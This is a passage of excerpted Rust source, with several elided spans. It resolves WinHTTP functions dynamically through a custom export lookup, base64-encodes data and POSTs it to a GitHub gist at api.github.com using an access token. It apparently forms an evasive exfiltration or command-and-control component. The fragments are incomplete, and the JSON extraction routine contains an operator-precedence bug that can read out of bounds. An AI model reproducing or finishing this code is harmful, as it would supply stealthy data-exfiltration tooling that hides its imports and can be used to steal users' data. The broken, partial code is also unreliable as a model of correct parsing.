...
type WinHttpOpenFn = unsafe extern "system" fn(
    *const u16, u32, *const u16, *const u16, u32,
) -> *mut c_void;

type WinHttpConnectFn = unsafe extern "system" fn(
    *mut c_void, *const u16, u16, u32,
) -> *mut c_void;

type WinHttpOpenRequestFn = unsafe extern "system" fn(
    *mut c_void, *const u16, *const u16, *const u16,
    *const u16, *const u16, u32,
) -> *mut c_void;

type WinHttpAddRequestHeadersFn = unsafe extern "system" fn(
    *mut c_void, *const u16, u32, u32,
) -> i32;

type WinHttpSendRequestFn = unsafe extern "system" fn(
    *mut c_void, *const u16, u32, *mut c_void, u32, u32, usize,
) -> i32;
...
unsafe fn resolve_winhttp() -> Option<WinHttpFns> {
    let a = |name: &[u8]| -> Option<usize> {
        crate::resolve::export_addr(b"winhttp.dll", name)
    };
    Some(WinHttpFns {
...
fn base64_encode(input: &[u8], output: &mut [u8]) -> usize {
    ...
    while i < ilen {
        ...
        if wi + 4 <= output.len() {
            output[wi] = TABLE[((triple >> 18) & 0x3F) as usize]; wi += 1;
            output[wi] = TABLE[((triple >> 12) & 0x3F) as usize]; wi += 1;
            output[wi] = if i + 1 < ilen { TABLE[((triple >> 6) & 0x3F) as usize] } else { b'=' }; wi += 1;
            output[wi] = if i + 2 < ilen { TABLE[(triple & 0x3F) as usize] } else { b'=' }; wi += 1;
        }
        i += 3;
    }
    wi
...
fn json_extract_str(json: &[u8], key: &[u8], out: &mut [u8]) -> bool {
    ...
    while i + klen + 4 < json.len() {
        if json[i] == b'"' && &json[i+1..i+1+klen] == key && json[i+1+klen] == b'"' {
            ...
            i += 1;
            while i < json.len() && json[i] == b' ' || json[i] == b'"' { i += 1; }
            let mut o = 0usize;
            while i < json.len() && json[i] != b'"' && o + 1 < out.len() {
                out[o] = json[i]; o += 1; i += 1;
            }
            out[o] = 0;
            return o > 0;
        }
...
pub unsafe fn upload_gist(
    ...
    let session = (fns.open)(ua.as_ptr(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        core::ptr::null(), core::ptr::null(), 0);
    if session.is_null() { return Err("WinHttpOpen failed"); }

    let host = to_utf16(b"api.github.com");
    let conn = (fns.connect)(session, host.as_ptr(), 443, 0);
    if conn.is_null() { (fns.close)(session); return Err("WinHttpConnect failed"); }

    let path = to_utf16(b"/gists");
    let verb = to_utf16(b"POST");
    let req = (fns.open_request)(conn, verb.as_ptr(), path.as_ptr(),
        core::ptr::null(), core::ptr::null(), core::ptr::null(), WINHTTP_FLAG_SECURE);
    if req.is_null() { (fns.close)(conn); (fns.close)(session); return Err("WinHttpOpenRequest failed"); }

    // Headers
    let auth = {
        let mut s = to_utf16(b"Authorization: token ");
        for b in pat_token.as_bytes() { s.push(*b as u16); }
        s.push(0);
        s
    };
    ...
    // Send
    if (fns.send)(req, core::ptr::null(), 0, body.as_mut_ptr() as *mut c_void, body.len() as u32, body.len() as u32, 0) == 0 {
        (fns.close)(req); (fns.close)(conn); (fns.close)(session);
    ...
    loop {
        ...
        if remain == 0 { break; }
        if (fns.read)(req, resp.as_mut_ptr().add(total as usize), remain, &mut read) == 0 || read == 0 {
            break;
        }
        total += read;
    }
